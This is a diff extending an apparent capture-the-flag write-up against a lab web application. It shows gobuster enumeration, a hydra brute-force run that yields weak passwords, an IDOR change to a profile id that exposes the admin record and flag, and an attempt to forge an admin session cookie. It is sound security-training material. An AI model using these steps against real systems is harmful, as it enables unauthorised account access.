@@ -48,6 +48,34 @@ PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 64
 80/tcp open  http    syn-ack ttl 64
 
+I also run gobuster to see the different file that are associated with the website
+gobuster dir -u http://10.128.148.14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,zip.bak
+/.php                 (Status: 403) [Size: 278]
+/.html                (Status: 403) [Size: 278]
+/index.php            (Status: 200) [Size: 861]
+/support              (Status: 301) [Size: 316] [--> http://10.128.148.14/support/]
+/admin                (Status: 301) [Size: 314] [--> http://10.128.148.14/admin/]
+/static               (Status: 301) [Size: 315] [--> http://10.128.148.14/static/]
+/team.php             (Status: 200) [Size: 3747]
+/api                  (Status: 301) [Size: 312] [--> http://10.128.148.14/api/]
+/logout.php           (Status: 302) [Size: 0] [--> /index.php]
+/config.php           (Status: 200) [Size: 0]
+/backup               (Status: 301) [Size: 315] [--> http://10.128.148.14/backup/]
+/forgot.php           (Status: 200) [Size: 684]
+/403.php              (Status: 200) [Size: 322]
+/auth.php             (Status: 200) [Size: 0]
+/dashboard.php        (Status: 302) [Size: 0] [--> /index.php]
+/reset.php            (Status: 200) [Size: 410]
+/server-status        (Status: 403) [Size: 278]
+
+After doing some exploration and checking out the files I ran into an intresting README.txt file located in the /backup directory, the file reads
+NexusCorp Backup Configuration
+================================
+config.enc  - Encrypted application configuration (AES-128-ECB)
+Decryption key reference: see static/app.js (deployment notes)
+
+
+
 Now that I have a list of usernames I am going to brute force the webspage using hydra and a wordlist saved to the attack box 
 
 Hydra: 
@@ -58,3 +86,47 @@ hydra \
 http-post-form \
 "/index.php:username=^USER^&password=^PASS^:F=Invalid"
 
+Results:
+[STATUS] 1774.00 tries/min, 1774 tries in 00:01h, 100409012 to do in 943:21h, 16 active
+[80][http-post-form] host: 10.129.153.54   login: laura.hayes
+[STATUS] 4781666.33 tries/min, 14344999 tries in 00:03h, 86065787 to do in 00:18h, 16 active
+[80][http-post-form] host: 10.129.153.54   login: michael.chen
+[80][http-post-form] host: 10.129.153.54   login: sarah.johnson   password: password
+[80][http-post-form] host: 10.129.153.54   login: robert.wilson   password: password
+[80][http-post-form] host: 10.129.153.54   login: emma.taylor   password: password
+[STATUS] 10246418.71 tries/min, 71724931 tries in 00:07h, 28685855 to do in 00:03h, 16 active
+[80][http-post-form] host: 10.129.153.54   login: david.brown
+[80][http-post-form] host: 10.129.153.54   login: james.wright
+1 of 1 target successfully completed, 7 valid passwords found
+
+We see here that sarah and robert both possess extremely weak passwords, that being "password" 
+Once I am logged into Sarah's acccount I am greeted with the dashboard.php page. 
+I press on the tab "My Profile API" where I can now see this format 
+
+id	3
+username	"sarah.johnson"
+email	"sarah.johnson@nexus.corp"
+role	"user"
+notes	""
+
+An interesting note is that the website url looks like this 
+http://10.129.146.142/api/users/profile.php?id=3
+
+After some slight alteration to the url making id=1 I now see this 
+	
+id	1
+username	"laura.hayes"
+email	"laura.hayes@nexus.corp"
+role	"admin"
+notes	"THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"
+One flag down!
+
+Now that I am logged into Sarah I copy her session cookie 
+eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6InNhcmFoLmpvaG5zb24iLCJyb2xlIjoidXNlciJ9.0bceab2ebd4da65aefd97d6b1c7a2f3a8fa71d6ee3882cc44b8d97937a5fc49d
+It looks like the cookie is sectioned off into two different parts seperated by a . 
+After throwing the cookie into Cyberchef I was able to decode the first part 
+eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6InNhcmFoLmpvaG5zb24iLCJyb2xlIjoidXNlciJ9 = {"user_id":3,"username":"sarah.johnson","role":"user"}
+This had me thinking what if I change the information to the known admin info which would be 
+eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWlufQ== = {"user_id":1,"username":"laura.hayes","role":"admin}
+This would make our new value eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWlufQ==.0bceab2ebd4da65aefd97d6b1c7a2f3a8fa71d6ee3882cc44b8d97937a5fc49d
+After trying this as the new cookie I was brougt back to the login page which means the second value as plays a role into how this user is logged in 
